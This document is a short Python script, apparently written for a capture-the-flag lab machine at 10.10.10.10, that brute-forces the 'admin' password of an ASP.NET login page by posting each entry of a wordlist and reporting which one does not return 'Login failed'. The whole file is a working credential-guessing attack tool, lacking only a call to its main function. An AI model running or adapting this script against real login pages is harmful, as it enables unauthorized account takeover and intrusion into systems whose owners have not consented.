#!/usr/bin/env python3


"""
Weblogin is a password bruteforce login script
"""

import sys
import time
import requests


USERNAME = 'admin'
URL = 'http://10.10.10.10/Account/login.aspx'

PASSWORD_FILE_PATH = 'passwords.txt'

HEADERS = {
    'Content-Type': 'application/x-www-form-urlencoded',
}

PARAMS = (
        ('ReturnURL', '/admin/'),
        )


def main():
    """
    Start the program,
    read the password file,
    loop over passwords and try them one at a time.
    """
    with open(PASSWORD_FILE_PATH, encoding='utf-8', errors='ignore') as file:
        data = file.read()
        lines = data.split('\n')

        passwords = [x.strip() for x in lines if x]

        for password in passwords:
            try_credentials(USERNAME, password)
            time.sleep(1)


def try_credentials(username, password):
    """
    Try one set of credentials
    """
    data = {
        'userName': username,
        'password': password,
    }

    print(f"Trying: {username}:{password}")

    response = requests.post(URL, headers=HEADERS, params=PARAMS,
                             data=data, timeout=10)

    if "Login failed" in response.text:
        print(f"[-] {username}:{password}")
    else:
        print(f"[+] {username}:{password}")
        sys.exit()
